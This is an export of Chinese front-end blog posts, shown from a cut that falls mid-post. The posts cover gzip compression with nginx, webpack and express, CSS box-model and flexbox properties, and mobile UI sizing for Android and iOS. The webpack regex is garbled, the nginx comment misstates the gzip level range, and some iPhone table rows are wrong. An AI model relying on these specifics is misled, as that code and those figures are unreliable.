<p>我们在浏览器的控制台中可以看到请求的相关信息</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e5ec64cbfb3c270e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h5 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h5><p>提到浏览器作为一个前端就不由自主的会想一个问题，会不会有浏览器不支持呢。<code>HTTP/1.0</code> 是1996年5月发布的。好消息是基本不用考虑兼容性的问题，几乎所有浏览器都支持它。值得一提的是 <code>ie6</code>的早起版本中存在一个会破坏 <code>gZip</code>的错误，后面 <code>ie6</code>本身在 <code>WinXP SP2</code> 中修复了这个问题，而且用这个版本的用户数量也很少。</p>
<h4 id="谁去压缩文件"><a href="#谁去压缩文件" class="headerlink" title="谁去压缩文件"></a>谁去压缩文件</h4><p>这件事看起来貌似只能服务端来做，我们在网上看到最多的也是诸如 <code>nginx</code> 开启 <code>gZip</code> 配置之类的文章，但是现在前端流行 <code>spa</code> 应用, 用 <code>react</code>, <code>vue</code> 之类的框架时候总伴随这一套自己的脚手架,一般用 <code>webpack</code> 作为打包工具，其中可以配置插件 如<a href="https://github.com/webpack-contrib/compression-webpack-plugin">compression-webpack-plugin</a> 可以让我们把生成文件进行 <code>gZip</code> 等压缩并生成对应的压缩文件，而我们应用在构架时候有可能也会在服务区和前端文件中放置一层 <code>node</code> 应用来进行接口鉴权和文件转发。<code>nodejs</code>中我们熟悉的<code>express</code> 框架中也有一个<a href="https://github.com/expressjs/compression">compression</a> 中间件，可以开启<code>gZip</code>,一时间看的人眼花缭乱，到底应该用谁怎么用呢？</p>
<h5 id="服务端响应请求时候压缩"><a href="#服务端响应请求时候压缩" class="headerlink" title="服务端响应请求时候压缩"></a>服务端响应请求时候压缩</h5><p>其实 <code>nginx</code> 压缩和 <code>node</code> 框架中用中间件去压缩都是一样的，当我们点击网页发送一个请求时候，我们的服务端会找到对应的文件，然后对文件进行压缩返回压缩后的内容【<em>当然可以利用缓存减少压缩次数</em>】，并配置好我们上面提到的 <code>Content-Encoding</code> 信息。对于一些应用在构架时候并没有上游代理层，比如服务端就一层 <code>node</code> 就可以直接用自己本身的压缩插件对文件进行压缩，如果上游配有有 <code>nginx</code> 转发处理层，最好交给 <code>nginx</code> 来处理这些，因为它们有专门为此构建的内容，可以更好的利用缓存并减小开销（很多使用c语言编写的）。</p>
<p>我们看一些 <code>nginx</code> 中开启 <code>gZip</code> 压缩的一部分配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 开启gzip</span><br><span class="line">gzip on;</span><br><span class="line"># 启用gzip压缩的最小文件，小于设置值的文件将不会压缩</span><br><span class="line">gzip_min_length 1k;</span><br><span class="line"># gzip 压缩级别，1-10，数字越大压缩的越好，也越占用CPU时间，后面会有详细说明</span><br><span class="line">gzip_comp_level 2;</span><br><span class="line"># 进行压缩的文件类型。javascript有多种形式。其中的值可以在 mime.types 文件中找到。</span><br><span class="line">gzip_types text&#x2F;plain application&#x2F;javascript application&#x2F;x-javascript text&#x2F;css application&#x2F;xml text&#x2F;javascript;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="应用构建时候压缩"><a href="#应用构建时候压缩" class="headerlink" title="应用构建时候压缩"></a>应用构建时候压缩</h5><p>既然服务端都可以做了为什么 <code>webpack</code> 在打包前端应用时候还有这样一个压缩插件呢，我们可以在上面 <code>nginx</code> 配置中看到 <code>gzip_comp_level 2</code> 这个配置项，上面也有注释写道 <code>1-10</code> 数字越大压缩效果越好，但是会耗费更多的CPU和时间，我们压缩文件除了减少文件体积大小外，也是为了减少传输时间，如果我们把压缩等级配置的很高，每次请求服务端都要压缩很久才回返回信息回来，不仅服务器开销会增大很多，请求方也会等的不耐烦。但是现在的 <code>spa</code> 应用既然文件都是打包生成的，那如果我们在打包时候就直接生成高压缩等级的文件，作为静态资源放在服务器上，接收到请求后直接把压缩的文件内容返回回去会怎么样呢？</p>
<p><code>webpack</code> 的 <code>compression-webpack-plugin</code> 就是做这个事情的，配置起来也很简单只需要在装置中加入对应插件,简单配置如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const CompressionWebpackPlugin &#x3D; require(&#39;compression-webpack-plugin&#39;);</span><br><span class="line"></span><br><span class="line">webpackConfig.plugins.push(</span><br><span class="line">    new CompressionWebpackPlugin(&#123;</span><br><span class="line">      asset: &#39;[path].gz[query]&#39;,</span><br><span class="line">      algorithm: &#39;gzip&#39;,</span><br><span class="line">      test: new RegExp(&#39;\\.(js|css)&#x2F;article&gt;),</span><br><span class="line">      threshold: 10240,</span><br><span class="line">      minRatio: 0.8</span><br><span class="line">    &#125;)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>webpack</code> 打包完成后生成打包文件外还会额外生成 <code>.gz</code> 后缀的压缩文件</p>
<p>[图片上传失败…(image-b14f20-1614231793629)] </p>
<p>那么这个插件的压缩等级是多少呢，我们可以在<a href="https://github.com/webpack-contrib/compression-webpack-plugin/blob/master/src/index.js">源码</a>中看到默认的 <code>level</code> 是 <strong>9</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">const zlib &#x3D; require(&#39;zlib&#39;);</span><br><span class="line">this.options.algorithm &#x3D; zlib[this.options.algorithm];</span><br><span class="line">...</span><br><span class="line">this.options.compressionOptions &#x3D; &#123;</span><br><span class="line">    level: options.level || 9,</span><br><span class="line">    flush: options.flush</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到压缩使用的是 <code>zlib</code> 库，而 <code>zlib</code> 分级来说，默认是 6 ，最高的级别就是<code>9 Best compression (also zlib.Z_BEST_COMPRESSION)</code>,因为我们只有在上线项目时候才回去打包构建一次，所以我们在构建时候使用最高级的压缩方式压缩多耗费一些时间对我们来说根本没任何损耗，而我们在服务器上也不用再去压缩文件，只需要找到相应已经压缩过的文件直接返回就可以了。</p>
<h6 id="服务端怎么找到这些文件"><a href="#服务端怎么找到这些文件" class="headerlink" title="服务端怎么找到这些文件"></a>服务端怎么找到这些文件</h6><p>在应用层面解决这个问题还是比较简单的，比如上述压缩文件会产生<code>index.css</code>, <code>index.js</code>的压缩文件，在服务端简单处理可以判断这两个请求然后给予相对应的压缩文件。以 <code>node</code> 的 <code>express</code> 为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">app.get([&#39;&#x2F;index.js&#39;,&#39;&#x2F;index.css&#39;], function (req, res, next) &#123;</span><br><span class="line">  req.url &#x3D; req.url + &#39;.gz&#39;</span><br><span class="line">  res.set(&#39;Content-Encoding&#39;, &#39;gzip&#39;)</span><br><span class="line">  res.setHeader(&quot;Content-Type&quot;, generateType(req.path)) &#x2F;&#x2F; 这里要根据请求文件设置content-type</span><br><span class="line">  next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>上面我们可以给请求返回 <code>gZip</code> 压缩后的数据了，当然上面的局限性太强也不可取，但是对于处理这个方面需求也已经有很多库存在,<code>express</code> 有 <a href="https://github.com/tkoenig89/express-static-gzip">express-static-gzip</a> 插件 <code>koa</code> 的 <code>koa-static</code> 则默认自带对 <code>gZip</code> 文件的检测，基本原理就是对请求先检测 <code>.gz</code>后缀的文件是否存在，再去根据结果返回不同的内容。</p>
<h4 id="哪些文件可以被-gZip-压缩"><a href="#哪些文件可以被-gZip-压缩" class="headerlink" title="哪些文件可以被 gZip 压缩"></a>哪些文件可以被 gZip 压缩</h4><p><code>gZip</code> 可以压缩所有的文件，但是这不代表我们要对所有文件进行压缩，我们写的代码（<code>css,js</code>）之类的文件会有很好的压缩效果，但是图片之类文件则不会被 <code>gzip</code> 压缩太多，因为它们已经内置了一些压缩，一些文件（比如一些已经被压缩的像.zip文件那种）再去压缩可能会让生成的文件体积更大一些。当然已经很小的文件也没有去压缩的必要了。</p>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>能开启 <code>gZip</code> 肯定是要开启的，具体使用在请求时候实时压缩还是在构建时候去生成压缩文件，就要看自己具体业务情况。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li>  <a href="https://stackoverflow.com/questions/20762094/how-are-zlib-gzip-and-zip-related-what-do-they-have-in-common-and-how-are-they/20765054#20765054">How are zlib, gzip and zip related? What do they have in common and how are they different?</a></li>
<li>  <a href="https://stackoverflow.com/questions/38587698/webpack-gzip-vs-express-gzip?s=1%7C140.9128">webpack gzip vs express gzip</a></li>
<li>  <a href="https://stackoverflow.com/questions/16691506/what-is-gzip-compression">What is gZip compression?</a></li>
<li>  <a href="http://www.ruanyifeng.com/blog/2016/08/http.html">HTTP 协议</a></li>
</ul>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>标准盒模型</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E6%A0%87%E5%87%86%E7%9B%92%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h5 id="1、一个盒子的构成："><a href="#1、一个盒子的构成：" class="headerlink" title="1、一个盒子的构成："></a>1、一个盒子的构成：</h5><ul>
<li><p>盒子中的内容：content 宽=width 高=height</p>
</li>
<li><p>盒子的边框：border</p>
</li>
<li><p>盒子边框与内容之间的距离：称为填充—padding 内边距（内补丁）</p>
</li>
<li><p>如果有多个盒子存在，盒子与盒子之间的距离：称为边界—margin，外边距（外补丁）</p>
</li>
<li><p>整个盒子模型在网页中所占的宽度：左边界+左边框+左填充+内容+右填充+右边框+右边<br>界<br><img src="https://upload-images.jianshu.io/upload_images/10024246-50fe38676d0998e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p>关于如何切图：</p>
<blockquote>
<p>PC：先看全图分块切，<br>移动端：看所有图片找出共同模块，分组切</p>
</blockquote>
</li>
<li><p>关于适配问题：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-eded6984b876f273.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
</ul>
<h5 id="2、弹性布局"><a href="#2、弹性布局" class="headerlink" title="2、弹性布局"></a>2、弹性布局</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">display: flex | inline-flex; (适用于父类容器元素上)</span><br></pre></td></tr></table></figure>
<p>定义一个 flex 容器，内联或者根据指定的值，来作用于下面的子类容器。</p>
<ul>
<li> box：将对象作为弹性伸缩盒显示。（伸缩盒最老版本）</li>
<li>  inline-box：将对象作为内联块级弹性伸缩盒显示。（伸缩盒最老版本）</li>
<li> flexbox：将对象作为弹性伸缩盒显示。（伸缩盒过渡版本）</li>
<li> inline-flexbox：将对象作为内联块级弹性伸缩盒显示。（伸缩盒过渡版本）</li>
<li> flex：将对象作为弹性伸缩盒显示。（伸缩盒最新版本）</li>
<li> inline-flex：将对象作为内联块级弹性伸缩盒显示。（伸缩盒最新版本）<h5 id="2-1-H5-用的老版本伸缩盒模型-display-box"><a href="#2-1-H5-用的老版本伸缩盒模型-display-box" class="headerlink" title="2.1 H5 用的老版本伸缩盒模型 display: box;"></a>2.1 H5 用的老版本伸缩盒模型 display: box;</h5>常用属性：</li>
<li> <strong>box-flex:子元素的之间的比例。</strong><br>可以定义把父元素分成几份，如一个父 div 的 width：400px；里面有三<br>个子 div，分别定义-webkit-box-flex：2; -webkit-box-flex：1; -webkitbox-flex：1;那么三个子<br>div 的宽度会自动充满整个父盒子，宽度分别是<br>400*(2/2+1+1)=200px; 400*(1/2+1+1)=100px; 400*(1/2+1+1)=100p<br>x;</li>
<li> <strong>box-orient: 用来确定子元素的方向，是横着排还是竖着走。</strong><br>可选的值有：<strong>horizontal、vertical、inline-axis、block-axis、inherit</strong><br>Horizontal 与 inline-axis 的表现是一致的，让子元素横排。<br>Vertical 与 block-axis 的表现是一致的，让子元素纵列。<br>l box-direction：是用来确定子元素的排列顺序。<br>可选的值有：<strong>normal、reverse、inherit</strong><br>Normal 是默认值，表示按照正常顺序排列，从上到下，从左到右。<br>Reverse 表示与正常顺序相反。</li>
<li> <strong>box-align：与 box-pack 都是决定盒子内部剩余空间怎么使用的，</strong><br>决定了父容器里子容器的垂直对齐方式。<br>可选的值有：<strong>start、end、center、baseline、stretch</strong><br>Start 表示居顶对齐。<br>End 表示居底对齐。<br>Center：表示居中对齐。<br>Baseline：表示与基线对齐。<br>Stretch 为默认值，表示拉伸，拉伸到与父容器等高。</li>
<li> <strong>box-pack：决定了父标签水平遗留空间的使用。即父容器里子容器</strong><br>的水平对齐方式。<br>可选的值有：start、end、center、justify<br>Start 为默认值，表示水平居左对齐。<br>End 表示水平居右对齐。<br>Center：表示水平居中对齐。<br>Justify 表示水平两端对齐。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-182dfad14cfa9932.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></li>
</ul>
<h5 id="2-2-新版本-display-flex"><a href="#2-2-新版本-display-flex" class="headerlink" title="2.2 新版本 display:flex;"></a>2.2 新版本 display:flex;</h5><p>常用属性：</p>
<ul>
<li><strong>flex-direction: row | column | row-reverse | column-reverse</strong><br>决定主轴的方向（即项目的排列方向）。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-bec5ad15cd8fdedb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></li>
</ul>
<p>flex-warp: nowrap | wrap | wrap-reverse;<br>定义是否要换行，如何换行。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-f05c3c69d62c43a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li><p><strong>justify-content:flex-start|flex-end|center|space-between|space-around</strong><br>定义项目在主轴上的对齐方式<br><img src="https://upload-images.jianshu.io/upload_images/10024246-c9b49800aa86f342.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p><strong>align-items: flex-start |flex-end |center |baseline |stretch;</strong><br>定义项目在交叉轴上如何对齐<br><img src="https://upload-images.jianshu.io/upload_images/10024246-0ecf0d58bb9d8ff1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
<li><p><strong>flex-flow: flex-direction flex-warp;</strong><br>以上属性均加在父盒子上生效。下边两个是加在子元素上生效的属性：</p>
</li>
<li><p> <strong>flex: 是 flex-grow，flex-shrink，flex-basis 三个属性的简写。</strong><br>默认值：0 1 auto；<br>设置或检索伸缩盒对象的子元素如何分配空间。后两个属性可省。<br>如果缩写 flex:1, 则其计算值为：1 1 0</p>
<blockquote>
<p>flex-grow 属性定义项目的放大比例，默认为 0，即如果存在剩余空间，也不放大。<br>flex-shrink 属性定义了项目的缩小比例，默认为 1，即如果空间不足，该项目将缩小。<br>flex-basis 属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览<br>器根据这个属性，计算主轴是否有多余空间。它的默认值为 auto，即项目的本来大小。</p>
</blockquote>
</li>
<li><p><strong>align-self: auto |flex-start |flex-end |center |baseline |stretch;</strong><br>允许单个项目有与其他项目不一样的对齐方式，可覆盖 align-items 属性。默认<br>值为auto，表示继承父元素的align-items属性。除auto外，其余同align-items。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-ac538224c8c5f08f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
</ul>
<p>总结：<br>伸缩盒模型<br>父元素 子元素<br>方向 主轴对齐(x) 交叉轴对齐(y) 分配空间<br>box<br>box-orient<br>box-pack box-align box-flex<br>box-direction<br>flex flex-direction Justify-content align-items flex</p>
<blockquote>
<p><code>注：flex 新增属性——flex-wrap(是否换行),align-self（子元素自己的对齐方式）</code></p>
</blockquote>
<p>参考网址：</p>
<blockquote>
<p><a href="http://caibaojian.com/flexbox-guide.html">http://caibaojian.com/flexbox-guide.html</a><br><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html">http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html</a><br><a href="http://www.w3cplus.com/css3/css3-flexbox-layout.html">http://www.w3cplus.com/css3/css3-flexbox-layout.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>移动应用界面设计的尺寸设置及规范</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%B0%BA%E5%AF%B8%E8%AE%BE%E7%BD%AE%E5%8F%8A%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<p><strong>一、android篇</strong></p>
<p><strong>1、android分辨率</strong></p>
<p>Android的多分辨率，一向是设计师和开发者非常头疼的事儿。尽管如此，对于多分辨造成的复杂问题，也是大家要优先解决的。Android支持多种不同的dpi模式：ldpi 、mdpi 、hdpi 、xhdpi 、xxhdpi 、xxxhdpi<br><img src="https://upload-images.jianshu.io/upload_images/10024246-b58e0e6c4419b53b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="移动应用界面设计的尺寸设置及规范_"></p>
<p>注意，ppi、dpi 是密度单位，不是度量单位 ：</p>
<ul>
<li><p>  ppi (pixels per inch)：图像分辨率 （在图像中，每英寸所包含的像素数目）</p>
</li>
<li><p>  dpi (dots per inch)： 打印分辨率 （每英寸所能打印的点数，即打印精度）</p>
</li>
</ul>
<p>dpi主要应用于输出，重点是打印设备上；ppi对于设计师应该比较熟悉，photoshop画布的分辨率常设置为72像素/英寸，这个单位其实就是ppi 。尽管概念不同，但是对于移动设备的显示屏，可以看作ppi=dpi 。</p>
<p>ppi的运算方式是：PPI = √（长度像素数² + 宽度像素数²） / 屏幕对角线英寸数。即：长、宽各自平方之和的开方，再除以屏幕对角线的英寸数。</p>
<p>以iphone5为例，其ppi=√（1136px² + 640px²）/4 in=326ppi（视网膜Retina屏）</p>
<p>对于android手机，一个不确切的分法是，720 x 1280 的手机很可能接近 320 dpi （xhdpi模式），480 x 800 的手机很可能接近 240 dpi （hdpi模式），而320 x 480 的手机则很接近 160 dpi（mdpi模式）。</p>
<p><strong>2、单位换算方法</strong></p>
<p>android开发中，文字大小的单位是sp，非文字的尺寸单位用dp，但是我们在设计稿用的单位是px。这些单位如何换算，是设计师、开发者需要了解的关键。</p>
<ul>
<li><p>  dp：Density-independent pixels，以160PPI屏幕为标准，则1dp=1px。dp和px的换算公式 ：dp*ppi/160 = px。对于320ppi的屏幕，1dp x 320ppi/160 = 2px。</p>
</li>
<li><p>  sp：Scale-independent pixels，它是安卓的字体单位，以160PPI屏幕为标准，当字体大小为 100%时， 1sp=1px。sp 与 px 的换算公式：sp*ppi/160 = px。对于320ppi的屏幕，1sp x 320ppi/160 = 2px。</p>
</li>
</ul>
<p>简单理解的话，px（像素）是我们UI设计师在PS里使用的，同时也是手机屏幕上所显示的，dp是开发写layout的时候使用的尺寸单位。</p>
<p><strong>为什么要把sp和dp代替px？</strong>原因是他们不会因为ppi的变化而变化，在相同物理尺寸和不同ppi下，他们呈现的高度大小是相同。也就是说更接近物理呈现，而px则不行。</p>
<p><strong>根据单位换算方法，可总结出：</strong></p>
<p>当运行在mdpi下时，1dp=1px ：也就是说设计师在PS里定义一个item高48px，开发就会定义该item高48dp ；</p>
<p>当运行在hdpi模式下时，1dp=1.5px ：也就是说设计师在PS里定义一个item高72px，开发就会定义该item高48dp ；</p>
<p>当运行在xhdpi模式下时，1dp=2px ：也就是说设计师在PS里定义一个item高96px，开发就会定义该item高48dp ；</p>
<p>当你的app需要适配多个dpi模式的时候，请参考图1的比例进行换算 。</p>
<p><strong>3、设计稿基本元素的尺寸设置</strong></p>
<p>为了适应多分辨率的手机，理想的方式是为每种分辨率做一套设计稿，包括所用到的icon、设计稿标注等。但在实际开发中，这种方法耗时耗力。所以通常会选择折中的方法。</p>
<p><strong>方法一</strong>：在标准基础上（比如xhdpi）开始，然后放大或缩小，以适应到其他尺寸。不足之处是，对于更高分辨率的手机，图标被放大后会导致质量不高。</p>
<p><strong>方法二：</strong>以最高分辨率为基准设计，然后缩小适应到所需的小分辨率上。缺点是，图标等若都最大尺寸，加载时速度慢且耗费流量较多，对于小分辨率的用户也不够好。</p>
<p>结合友盟的分辨率占比数据、也为了方便换算到android开发中的尺寸单位，<strong>推荐设计稿的画布尺寸选用 720X1280 ，分辨率仍旧为72ppi（像素/英寸）。</strong></p>
<p>在android规范中对于导航栏、工具栏等的尺寸没有明确的规定。但根据48dp原则，以及一些主流的android应用的截图分析，总结一下尺寸要求：</p>
<p><strong>状态栏高度</strong>：50 px</p>
<p><strong>导航栏、操作栏高度</strong>：96 px=48dp x 2</p>
<p><strong>主菜单栏高度</strong>：96 px</p>
<p><strong>内容区域高度</strong>：1038 px （1280-50-96-96=1038）</p>
<p>Android最近出的手机都几乎去掉了实体键，把功能键移到了屏幕中，高度也和菜单栏一样为：96 px</p>
<p><strong>4、图标和字体大小（来自官方规范文档）</strong></p>
<p>a、启动图标（home页或app列表页）</p>
<p>整体大小为48 x 48 dp<br><img src="https://upload-images.jianshu.io/upload_images/10024246-a69bccead1f7a395.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="移动应用界面设计的尺寸设置及规范_"></p>
<p>b、操作栏图标，代表用户在app中可以使用到的最重要的图标</p>
<p>整体大小为32 x 32 dp ，图形实际区域为 24 x 24 dp</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-60ade459f9c5e979.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="移动应用界面设计的尺寸设置及规范_"></p>
<p>c、小图标/场景图标，提供操作或特定项目的状态。</p>
<p>比如gmail app的星型标记、一些内容展开收起用到的向下向上的图标等。整体大小为16 x 16 dp ，图形实际区域为 12 x 12 dp 。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-34aefc77df01265b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="移动应用界面设计的尺寸设置及规范_"></p>
<p>d、通知图标</p>
<p>如果app有通知，要提供一个有新通知时显示在状态栏的通知图标。整体大小为24 x 24 dp ，图形实际区域为 22 x 22 dp 。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-13dccc1657345b7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="移动应用界面设计的尺寸设置及规范_"></p>
<p>注：android规范提供的尺寸单位是dp，若设计稿尺寸设为720 x 1280 ，图标大小需在规范要求的尺寸数字上乘以2。比如操作栏图标32 x 32 dp ，则设计稿上应该是64 x 64 px 。</p>
<p>e、字体大小</p>
<p>Android规范中的要求如下：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-37292659f59b5e75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="移动应用界面设计的尺寸设置及规范_"></p>
<p>前面提到Android开发中的字号单位是sp，而换算关系是 sp*ppi/160 = px 。所以720 x 1280尺寸的设计稿上，字体大小可选择为 24px 、28px 、32px 、36px ，主要根据文字的重要程度来选择，特殊情况下也可能选择更大或更小的字体。</p>
<p>f、其他尺寸要求</p>
<p>通常把48dp作为可触摸的UI元件的标准。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-41912e664c23c31c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="移动应用界面设计的尺寸设置及规范_"></p>
<p><strong>为什么要用48dp呢？一般来说，48dp转化为一个物理尺寸约9毫米。通常建议目标大小为7-10毫米，以方便用户手指能准确并且舒适触摸目标区域</strong>。</p>
<p>如果你设计的元素高和宽至少48dp，你就可以保证：</p>
<p>（1）触摸目标绝不会比建议的最低目标（7mm）小，无论在什么屏幕上显示。</p>
<p>（2）在整体信息密度和触摸目标大小之间取得了一个很好的平衡。</p>
<p>另外，每个UI元素之间的空白通常是8dp 。</p>
<p><strong>二、iOS篇</strong></p>
<p><strong>1、分辨率</strong></p>
<p>iPhone 界面尺寸：</p>
<table>
<thead>
<tr>
<th align="center">设备</th>
<th align="center">屏幕尺寸（英寸）</th>
<th align="center">逻辑分辨率（Point）</th>
<th align="center">缩放倍率（Scale Factor）</th>
<th align="center">像素分辨率（Pixel）</th>
<th align="center">屏幕像素密度（PPI）</th>
</tr>
</thead>
<tbody><tr>
<td align="center">iPhone 3GS</td>
<td align="center">3.5</td>
<td align="center">320*480</td>
<td align="center"><a href="mailto:&#x75;&#x73;&#x65;&#x72;&#64;&#49;&#x78;&#46;&#112;&#x6e;&#x67;">&#x75;&#x73;&#x65;&#x72;&#64;&#49;&#x78;&#46;&#112;&#x6e;&#x67;</a></td>
<td align="center">320*480</td>
<td align="center">163</td>
</tr>
<tr>
<td align="center">iPhone 4/4s</td>
<td align="center">3.5</td>
<td align="center">320*480</td>
<td align="center"><a href="mailto:&#117;&#115;&#x65;&#114;&#64;&#x32;&#120;&#x2e;&#112;&#110;&#103;">&#117;&#115;&#x65;&#114;&#64;&#x32;&#120;&#x2e;&#112;&#110;&#103;</a></td>
<td align="center">640*960</td>
<td align="center">330</td>
</tr>
<tr>
<td align="center">iPhone 5/5s/5c</td>
<td align="center">4.0</td>
<td align="center">320*568</td>
<td align="center"><a href="mailto:&#117;&#115;&#x65;&#x72;&#64;&#x32;&#120;&#46;&#112;&#110;&#103;">&#117;&#115;&#x65;&#x72;&#64;&#x32;&#120;&#46;&#112;&#110;&#103;</a></td>
<td align="center">640*1136</td>
<td align="center">326</td>
</tr>
<tr>
<td align="center">iPhone SE</td>
<td align="center">4.0</td>
<td align="center">320*568</td>
<td align="center"><a href="mailto:&#117;&#x73;&#x65;&#x72;&#64;&#x32;&#120;&#x2e;&#112;&#110;&#x67;">&#117;&#x73;&#x65;&#x72;&#64;&#x32;&#120;&#x2e;&#112;&#110;&#x67;</a></td>
<td align="center">640*1136</td>
<td align="center">326</td>
</tr>
<tr>
<td align="center">iPhone 6</td>
<td align="center">4.7</td>
<td align="center">375*667</td>
<td align="center"><a href="mailto:&#x75;&#115;&#101;&#x72;&#x40;&#50;&#120;&#x2e;&#112;&#x6e;&#103;">&#x75;&#115;&#101;&#x72;&#x40;&#50;&#120;&#x2e;&#112;&#x6e;&#103;</a></td>
<td align="center">640*1136</td>
<td align="center">326</td>
</tr>
<tr>
<td align="center">iPhone 6s</td>
<td align="center">4.7</td>
<td align="center">375*667</td>
<td align="center"><a href="mailto:&#117;&#115;&#x65;&#114;&#64;&#50;&#x78;&#46;&#112;&#110;&#103;">&#117;&#115;&#x65;&#114;&#64;&#50;&#x78;&#46;&#112;&#110;&#103;</a></td>
<td align="center">750*1334</td>
<td align="center">326</td>
</tr>
<tr>
<td align="center">iPhone 7</td>
<td align="center">4.7</td>
<td align="center">375*667</td>
<td align="center"><a href="mailto:&#117;&#115;&#101;&#x72;&#x40;&#x32;&#120;&#x2e;&#112;&#x6e;&#x67;">&#117;&#115;&#101;&#x72;&#x40;&#x32;&#120;&#x2e;&#112;&#x6e;&#x67;</a></td>
<td align="center">750*1334</td>
<td align="center">326</td>
</tr>
<tr>
<td align="center">iPhone 8</td>
<td align="center">4.7</td>
<td align="center">375*667</td>
<td align="center"><a href="mailto:&#x75;&#x73;&#x65;&#x72;&#64;&#x32;&#x78;&#46;&#x70;&#110;&#103;">&#x75;&#x73;&#x65;&#x72;&#64;&#x32;&#x78;&#46;&#x70;&#110;&#103;</a></td>
<td align="center">750*1334</td>
<td align="center">401</td>
</tr>
<tr>
<td align="center">iPhone 6 Plus</td>
<td align="center">5.5</td>
<td align="center">414*736</td>
<td align="center"><a href="mailto:&#117;&#x73;&#x65;&#x72;&#x40;&#x33;&#x78;&#46;&#x70;&#110;&#103;">&#117;&#x73;&#x65;&#x72;&#x40;&#x33;&#x78;&#46;&#x70;&#110;&#103;</a></td>
<td align="center">1242*2208</td>
<td align="center">401</td>
</tr>
<tr>
<td align="center">iPhone 6s Plus</td>
<td align="center">5.5</td>
<td align="center">414*736</td>
<td align="center"><a href="mailto:&#x75;&#115;&#x65;&#114;&#64;&#51;&#120;&#46;&#x70;&#x6e;&#x67;">&#x75;&#115;&#x65;&#114;&#64;&#51;&#120;&#46;&#x70;&#x6e;&#x67;</a></td>
<td align="center">1242*2208</td>
<td align="center">401</td>
</tr>
<tr>
<td align="center">iPhone 7 Plus</td>
<td align="center">5.5</td>
<td align="center">414*736</td>
<td align="center"><a href="mailto:&#117;&#x73;&#x65;&#x72;&#x40;&#x33;&#120;&#46;&#112;&#110;&#103;">&#117;&#x73;&#x65;&#x72;&#x40;&#x33;&#120;&#46;&#112;&#110;&#103;</a></td>
<td align="center">1242*2208</td>
<td align="center">401</td>
</tr>
<tr>
<td align="center">iPhone 8 Plus</td>
<td align="center">5.5</td>
<td align="center">414*736</td>
<td align="center"><a href="mailto:&#117;&#115;&#x65;&#114;&#64;&#51;&#120;&#x2e;&#x70;&#110;&#x67;">&#117;&#115;&#x65;&#114;&#64;&#51;&#120;&#x2e;&#x70;&#110;&#x67;</a></td>
<td align="center">1242*2208</td>
<td align="center">401</td>
</tr>
<tr>
<td align="center">iPhone X</td>
<td align="center">5.8</td>
<td align="center">375*812</td>
<td align="center"><a href="mailto:&#117;&#x73;&#101;&#114;&#x40;&#51;&#120;&#46;&#112;&#x6e;&#103;">&#117;&#x73;&#101;&#114;&#x40;&#51;&#120;&#46;&#112;&#x6e;&#103;</a></td>
<td align="center">1125*2436</td>
<td align="center">458</td>
</tr>
<tr>
<td align="center">iPhone XS</td>
<td align="center">5.8</td>
<td align="center">375*812</td>
<td align="center"><a href="mailto:&#117;&#115;&#101;&#114;&#x40;&#x33;&#120;&#x2e;&#112;&#x6e;&#x67;">&#117;&#115;&#101;&#114;&#x40;&#x33;&#120;&#x2e;&#112;&#x6e;&#x67;</a></td>
<td align="center">1125*2436</td>
